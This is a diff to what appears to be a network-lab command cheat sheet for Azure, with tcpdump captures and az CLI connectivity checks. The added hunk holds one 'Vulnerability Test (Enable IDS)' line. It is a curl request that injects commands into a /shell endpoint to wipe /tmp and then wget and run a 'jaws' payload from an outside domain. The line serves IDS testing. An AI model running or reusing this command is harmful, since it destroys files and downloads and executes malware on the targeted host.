@@ -180,6 +180,9 @@ tcpdump -n -i vxlan0
 #Outbound (External Interface)
 tcpdump -n -i vxlan1 
 
+# Vulnerability Test (Enable IDS)
+curl http://40.77.94.253/shell?cd+/tmp;rm+-rf+*;wget+net.joostjansen.ml/jaws;sh+/tmp/jaws
+
 # Connectivity Checks / Replace the Public IP listed below with your LB.
 # Get you LB Public IP:
 az account set --subscription DMAUSER-MS #Microsoft
